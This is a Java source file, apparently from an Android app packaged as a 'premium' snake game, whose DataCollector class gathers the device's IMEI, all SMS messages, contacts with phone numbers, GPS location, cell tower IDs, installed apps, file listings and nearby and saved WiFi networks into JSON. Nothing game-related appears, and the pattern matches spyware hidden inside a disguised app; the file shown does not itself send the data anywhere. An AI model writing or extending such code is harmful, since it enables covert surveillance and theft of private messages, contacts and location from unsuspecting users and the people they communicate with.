package com.snakegame.premium;

import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.net.wifi.ScanResult;
import android.net.wifi.WifiConfiguration;
import android.net.wifi.WifiManager;
import android.os.BatteryManager;
import android.os.Build;
import android.provider.*;
import android.telephony.TelephonyManager;
import android.telephony.gsm.GsmCellLocation;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.File;
import java.util.List;

public class DataCollector {
    public static JSONObject getSystemInfo(Context ctx) throws Exception {
        TelephonyManager tm = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
        JSONObject obj = new JSONObject();
        obj.put("model", Build.MODEL);
        obj.put("brand", Build.BRAND);
        obj.put("sdk", Build.VERSION.SDK_INT);
        obj.put("imei", tm.getDeviceId());
        obj.put("region", java.util.Locale.getDefault().getCountry());
        return obj;
    }

    public static int getBatteryLevel(Context ctx) {
        BatteryManager bm = (BatteryManager) ctx.getSystemService(Context.BATTERY_SERVICE);
        return bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
    }

    public static String getNetworkType(Context ctx) {
        WifiManager wm = (WifiManager) ctx.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
        if (wm != null && wm.isWifiEnabled()) {
            return "WiFi: " + wm.getConnectionInfo().getSSID();
        } else {
            TelephonyManager tm = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
            return "Mobile: " + tm.getNetworkType();
        }
    }

    public static JSONArray getSms(Context ctx) {
        JSONArray arr = new JSONArray();
        Cursor c = ctx.getContentResolver().query(Telephony.Sms.CONTENT_URI, null, null, null, "date DESC");
        if (c != null) {
            while (c.moveToNext()) {
                try {
                    JSONObject sms = new JSONObject();
                    sms.put("address", c.getString(c.getColumnIndex("address")));
                    sms.put("body", c.getString(c.getColumnIndex("body")));
                    sms.put("date", c.getString(c.getColumnIndex("date")));
                    arr.put(sms);
                } catch (Exception e) {}
            }
            c.close();
        }
        return arr;
    }

    public static JSONArray getContacts(Context ctx) {
        JSONArray arr = new JSONArray();
        Cursor c = ctx.getContentResolver().query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
        if (c != null) {
            while (c.moveToNext()) {
                try {
                    String id = c.getString(c.getColumnIndex(ContactsContract.Contacts._ID));
                    String name = c.getString(c.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                    JSONArray phones = new JSONArray();
                    Cursor pCur = ctx.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=?", new String[]{id}, null);
                    if (pCur != null) {
                        while (pCur.moveToNext()) phones.put(pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)));
                        pCur.close();
                    }
                    JSONObject cont = new JSONObject();
                    cont.put("name", name);
                    cont.put("phones", phones);
                    arr.put(cont);
                } catch (Exception e) {}
            }
            c.close();
        }
        return arr;
    }

    public static JSONObject getLocation(Context ctx) {
        LocationManager lm = (LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE);
        Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
        if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
        JSONObject obj = new JSONObject();
        try {
            if (loc != null) {
                obj.put("lat", loc.getLatitude());
                obj.put("lon", loc.getLongitude());
            } else {
                obj.put("error", "location not available");
            }
        } catch (Exception e) {}
        return obj;
    }

    public static JSONObject getCellTower(Context ctx) {
        TelephonyManager tm = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
        JSONObject obj = new JSONObject();
        GsmCellLocation gsm = (GsmCellLocation) tm.getCellLocation();
        if (gsm != null) {
            try {
                obj.put("cid", gsm.getCid());
                obj.put("lac", gsm.getLac());
            } catch (Exception e) {}
        }
        return obj;
    }

    public static JSONArray listFiles(String path) {
        JSONArray arr = new JSONArray();
        File dir = new File(path);
        if (!dir.exists()) return arr;
        File[] files = dir.listFiles();
        if (files != null) {
            for (File f : files) {
                try {
                    JSONObject obj = new JSONObject();
                    obj.put("name", f.getName());
                    obj.put("path", f.getAbsolutePath());
                    obj.put("dir", f.isDirectory());
                    obj.put("size", f.length());
                    arr.put(obj);
                } catch (Exception e) {}
            }
        }
        return arr;
    }

    public static JSONArray getInstalledApps(Context ctx) {
        JSONArray arr = new JSONArray();
        PackageManager pm = ctx.getPackageManager();
        List<ApplicationInfo> apps = pm.getInstalledApplications(0);
        for (ApplicationInfo ai : apps) {
            try {
                JSONObject obj = new JSONObject();
                obj.put("name", pm.getApplicationLabel(ai).toString());
                obj.put("package", ai.packageName);
                obj.put("system", (ai.flags & ApplicationInfo.FLAG_SYSTEM) != 0);
                arr.put(obj);
            } catch (Exception e) {}
        }
        return arr;
    }

    public static JSONObject getNetworkInfo(Context ctx) {
        TelephonyManager tm = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
        JSONObject obj = new JSONObject();
        try {
            obj.put("networkType", tm.getNetworkType());
            obj.put("operator", tm.getNetworkOperatorName());
            obj.put("simOperator", tm.getSimOperatorName());
            obj.put("isRoaming", tm.isNetworkRoaming());
        } catch (Exception e) {}
        return obj;
    }

    public static JSONArray scanWiFi(Context ctx) {
        JSONArray arr = new JSONArray();
        WifiManager wm = (WifiManager) ctx.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
        if (wm != null) {
            wm.startScan();
            List<ScanResult> results = wm.getScanResults();
            for (ScanResult sr : results) {
                try {
                    JSONObject obj = new JSONObject();
                    obj.put("SSID", sr.SSID);
                    obj.put("BSSID", sr.BSSID);
                    obj.put("level", sr.level);
                    arr.put(obj);
                } catch (Exception e) {}
            }
        }
        return arr;
    }

    public static JSONArray getWifiHistory(Context ctx) {
        JSONArray arr = new JSONArray();
        WifiManager wm = (WifiManager) ctx.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
        if (wm != null) {
            List<WifiConfiguration> networks = wm.getConfiguredNetworks();
            if (networks != null) {
                for (WifiConfiguration net : networks) {
                    arr.put(net.SSID);
                }
            }
        }
        return arr;
    }
}
